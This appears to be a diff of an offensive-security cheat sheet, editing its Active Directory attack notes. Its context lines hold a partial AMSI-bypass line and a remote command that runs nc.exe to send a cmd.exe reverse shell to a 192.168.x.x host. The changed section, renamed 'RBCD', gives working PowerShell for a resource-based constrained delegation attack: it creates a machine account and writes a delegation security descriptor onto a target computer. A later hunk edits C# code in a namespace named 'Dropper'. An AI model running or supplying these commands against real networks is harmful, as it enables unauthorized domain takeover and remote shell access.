@@ -48,18 +48,13 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 Invoke-command -computername <System Name> -scriptblock { c:\windows\tasks\nc.exe 192.168.x.x 443 -e cmd.exe}
 ```
 ---
-#### Pivot
+#### RBCD
 ```
-Import Powermad.ps1
-
+<Import Powermad.ps1>
 New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
-
 $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
-
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
-
 $SDBytes = New-Object byte[] ($SD.BinaryLength)
-
 $SD.GetBinaryForm($SDBytes, 0)
 
 Get-DomainComputer -Identity <boxname> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
@@ -161,12 +156,6 @@ using System.Diagnostics;
 using System.Threading;
 
 
-
-// Might work best for testing in its own VS Solution/Project... otherwise:
-// C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe ExecutionTesting.cs
-
-// Thanks to this StackOverflow for getting me started:
-// https://stackoverflow.com/questions/10554913/how-to-call-createprocess-with-startupinfoex-from-c-sharp-and-re-parent-the-ch
 
 namespace Dropper
 {
